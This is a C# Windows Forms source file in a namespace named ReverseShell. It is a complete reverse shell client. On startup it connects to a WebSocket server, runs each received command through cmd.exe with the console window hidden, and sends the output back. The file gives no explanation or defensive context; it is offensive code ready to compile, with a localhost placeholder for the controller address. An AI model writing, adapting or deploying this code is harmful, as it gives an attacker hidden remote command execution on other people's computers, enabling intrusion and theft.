using System.Text;
using System.Text.Json.Nodes;
using WebSocketSharp;
using Newtonsoft.Json;
using System.Dynamic;
using System.Diagnostics;

namespace ReverseShell
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            connect();
            
        }
        void connect()
        {
            //string serverUrl = "wss://localhost:8080/client";
            string serverUrl = "ws://localhost:8080/client";

            var ws = new WebSocket(serverUrl);
            ws.Connect();

            ws.OnOpen += (sender, e) =>
            {
                Console.WriteLine("Connected to the server.");
            };

            ws.OnMessage += (sender, e) =>
            {
                dynamic o = JsonConvert.DeserializeObject(e.Data);

                if(Convert.ToString(o.action) == "cmd")
                {
                    string command = Convert.ToString(o.cmd);

                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    processStartInfo.FileName = "cmd.exe";
                    processStartInfo.Arguments = $"/C {command}";
                    processStartInfo.RedirectStandardOutput = true;
                    processStartInfo.UseShellExecute = false;
                    processStartInfo.CreateNoWindow = true;

                    Process process = new Process();
                    process.StartInfo = processStartInfo;
                    process.Start();

                    string output = process.StandardOutput.ReadToEnd();

                    dynamic x = new ExpandoObject();
                    x.action = "result";
                    x.result = output;

                    ws.Send(JsonConvert.SerializeObject(x));

                    process.WaitForExit();
                }
            };

            ws.OnClose += (sender, e) =>
            {
            };

            ws.OnError += (sender, e) =>
            {
            };

                

            
        }
    }
}
